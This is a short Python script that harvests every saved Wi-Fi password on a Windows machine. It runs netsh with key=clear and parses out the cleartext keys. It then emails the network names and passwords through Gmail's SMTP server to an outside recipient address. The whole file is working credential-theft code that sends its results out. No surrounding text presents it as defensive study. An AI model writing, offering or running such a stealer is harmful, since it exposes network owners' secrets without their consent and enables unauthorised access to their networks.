import subprocess, re
import smtplib
cmd = "netsh wlan show profile".split(" ")
output = subprocess.run(cmd, shell=True, capture_output=True).stdout.decode()
#Getting all wifis name.
wifis = re.findall(r" All User Profile     : (.*)\r", output)
# password = {} #For putting in dictionnary
password = " "
for wifi in wifis:
    cmd2 = ["netsh", "wlan", "show", "profile", wifi, "key=clear"]
    command_output = subprocess.run(cmd2, capture_output=True).stdout.decode()
    #Getting password from the wifi
    pasw = re.findall("Key Content            : (.*)\r", command_output)
    #Putting all in a dictionary
    try:
        # password[wifi] = pasw[0] #For putting in dictionary
        password += f"{wifi} : {pasw[0]}\n"
    except:
        continue
message = f"Subject: Sending Email\n\nemail body: {password}"
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login("sender@gmail.com", "The password")
server.sendmail("sender@gmail.com",
                "reciever@gmail.com",
                message)